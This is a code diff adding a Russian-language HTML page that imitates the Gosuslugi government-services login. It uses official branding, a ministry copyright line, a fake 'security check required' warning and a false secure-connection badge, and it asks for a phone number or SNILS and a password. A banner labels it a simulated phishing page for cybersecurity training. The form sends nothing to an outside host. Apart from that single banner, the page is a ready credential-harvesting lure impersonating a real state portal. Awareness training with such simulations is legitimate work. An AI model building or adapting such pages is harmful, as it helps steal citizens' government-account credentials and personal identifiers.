@@ -1,1 +1,387 @@
-eyjhj
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Госуслуги - Вход в личный кабинет</title>
+    <style type="text/css">
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f0f9ff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .header-banner {
+            background: linear-gradient(135deg, #0d47a1 0%, #1565c0 100%);
+            color: white;
+            padding: 8px 12px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 12px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        .header {
+            background: #0d47a1;
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            background: white;
+            border-radius: 6px;
+            margin-right: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #0d47a1;
+            font-size: 18px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .header-links {
+            font-size: 14px;
+        }
+        .header-links a {
+            color: white;
+            text-decoration: none;
+            margin-left: 20px;
+            opacity: 0.9;
+            transition: opacity 0.3s;
+        }
+        .header-links a:hover {
+            opacity: 1;
+            text-decoration: underline;
+        }
+        .main-container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            overflow-y: auto;
+        }
+        .login-container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 420px;
+            border: 1px solid #e0e0e0;
+        }
+        .security-alert {
+            background: #fff8e1;
+            border: 1px solid #ffd54f;
+            padding: 12px;
+            margin-bottom: 20px;
+            border-radius: 6px;
+        }
+        .security-alert-title {
+            color: #ff6f00;
+            font-weight: bold;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+        }
+        .security-alert-text {
+            color: #ff6f00;
+            font-size: 12px;
+            line-height: 1.5;
+        }
+        .login-title {
+            color: #0d47a1;
+            font-size: 24px;
+            margin-bottom: 8px;
+            font-weight: 600;
+            text-align: center;
+        }
+        .login-subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        label {
+            display: block;
+            margin-bottom: 6px;
+            color: #455a64;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 6px;
+            font-size: 15px;
+            transition: all 0.3s;
+            background: #fafafa;
+        }
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #0d47a1;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(13, 71, 161, 0.1);
+        }
+        .input-hint {
+            font-size: 12px;
+            color: #78909c;
+            margin-top: 4px;
+            font-style: italic;
+        }
+        .password-wrapper {
+            position: relative;
+        }
+        .password-toggle {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 12px;
+            padding: 5px 8px;
+            color: #546e7a;
+            user-select: none;
+            font-weight: 500;
+            border-radius: 4px;
+        }
+        .password-toggle:hover {
+            color: #0d47a1;
+            background: #f5f5f5;
+        }
+        input[type="password"] {
+            padding-right: 45px;
+        }
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #546e7a;
+        }
+        .remember-me input {
+            margin-right: 8px;
+            width: 16px;
+            height: 16px;
+        }
+        .login-button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #0d47a1 0%, #1565c0 100%);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 2px 4px rgba(13, 71, 161, 0.3);
+        }
+        .login-button:hover {
+            background: linear-gradient(135deg, #1565c0 0%, #0d47a1 100%);
+            box-shadow: 0 4px 8px rgba(13, 71, 161, 0.4);
+        }
+        .security-info {
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #e0e0e0;
+            text-align: center;
+        }
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            color: #4caf50;
+            font-size: 12px;
+            font-weight: 500;
+            background: #f1f8e9;
+            padding: 8px 12px;
+            border-radius: 4px;
+        }
+        .footer-links {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .footer-links a {
+            color: #0d47a1;
+            text-decoration: none;
+            margin: 0 10px;
+            font-size: 14px;
+            transition: color 0.3s;
+        }
+        .footer-links a:hover {
+            color: #0a3a8a;
+            text-decoration: underline;
+        }
+        .footer {
+            background: #f8f9fa;
+            padding: 15px 20px;
+            text-align: center;
+            color: #546e7a;
+            font-size: 12px;
+            border-top: 1px solid #e0e0e0;
+        }
+        .footer p {
+            margin: 5px 0;
+        }
+        .footer a {
+            color: #0d47a1;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 500px) {
+            .header-links {
+                display: none;
+            }
+            .login-container {
+                padding: 20px;
+                margin: 10px;
+            }
+        }
+        .training-notice {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            padding: 10px;
+            margin: 20px 0;
+            border-radius: 6px;
+            text-align: center;
+            font-size: 12px;
+            color: #856404;
+        }
+    </style>
+</head>
+<body>
+<div class="header-banner">Портал государственных услуг Российской Федерации</div>
+
+<div class="header">
+    <div class="logo">
+        <div class="logo-icon">🇷🇺</div>
+        Госуслуги
+    </div>
+    
+    <div class="header-links">
+        <a href="#">Услуги</a>
+        <a href="#">Запись</a>
+        <a href="#">Помощь</a>
+    </div>
+</div>
+
+<div class="main-container">
+    <div class="login-container">
+        <div class="security-alert">
+            <div class="security-alert-title">🔒 Требуется проверка безопасности</div>
+            <div class="security-alert-text">В целях защиты ваших данных требуется дополнительная проверка учетной записи.</div>
+        </div>
+        
+        <div class="training-notice">
+            🎓 УЧЕБНЫЙ ТРЕНИНГ ПО КИБЕРБЕЗОПАСНОСТИ<br>
+            <small>Это имитационная фишинговая страница для образовательных целей</small>
+        </div>
+        
+        <h1 class="login-title">Вход в личный кабинет</h1>
+        <p class="login-subtitle">Введите номер телефона или СНИЛС</p>
+        
+        <form action="" method="POST">
+            <div class="form-group">
+                <label for="username">Номер телефона или СНИЛС</label>
+                <input autofocus id="username" placeholder="+7 (XXX) XXX-XX-XX или XXX-XXX-XXX XX" required type="text"/>
+                <div class="input-hint">Введите номер телефона, привязанный к учетной записи, или СНИЛС</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Пароль</label>
+                <div class="password-wrapper">
+                    <input id="password" placeholder="Введите пароль" required type="password" name="password"/>
+                    <button aria-label="Показать/скрыть пароль" class="password-toggle" onclick="togglePassword()" type="button">
+                        <span id="toggleIcon">Показать</span>
+                    </button>
+                </div>
+            </div>
+            
+            <div class="remember-me">
+                <input id="remember" type="checkbox"/>
+                <label for="remember">Запомнить это устройство</label>
+            </div>
+            
+            <button class="login-button" type="submit">Войти</button>
+            
+            <div class="security-info">
+                <div class="security-badge">🔐 Защищённое соединение • ГОСТ 28147-89</div>
+            </div>
+            
+            <div class="footer-links">
+                <a href="#">Забыли пароль?</a>
+                <a href="#">Регистрация</a>
+                <a href="#">Войти через ЕСИА</a>
+            </div>
+        </form>
+    </div>
+</div>
+
+<div class="footer">
+    <p>© 2024 Министерство цифрового развития, связи и массовых коммуникаций Российской Федерации</p>
+    <p>
+        <a href="#">Политика конфиденциальности</a> | 
+        <a href="#">Обработка персональных данных</a> | 
+        <a href="#">Техническая поддержка</a>
+    </p>
+</div>
+
+<script>
+    function togglePassword() {
+        const passwordInput = document.getElementById('password');
+        const toggleIcon = document.getElementById('toggleIcon');
+        
+        if (passwordInput.type === 'password') {
+            passwordInput.type = 'text';
+            toggleIcon.textContent = 'Скрыть';
+        } else {
+            passwordInput.type = 'password';
+            toggleIcon.textContent = 'Показать';
+        }
+    }
+    
+    // Маска для ввода телефона/СНИЛС
+    document.getElementById('username').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        
+        if (value.length === 11 && (value.startsWith('7') || value.startsWith('8'))) {
+            // Формат телефона
+            let formatted = '+7 (' + value.substring(1, 4) + ') ' + value.substring(4, 7) + '-' + value.substring(7, 9) + '-' + value.substring(9, 11);
+            e.target.value = formatted;
+        } else if (value.length === 11) {
+            // Формат СНИЛС
+            let formatted = value.substring(0, 3) + '-' + value.substring(3, 6) + '-' + value.substring(6, 9) + ' ' + value.substring(9, 11);
+            e.target.value = formatted;
+        }
+    });
+</script>
+</body>
+</html>
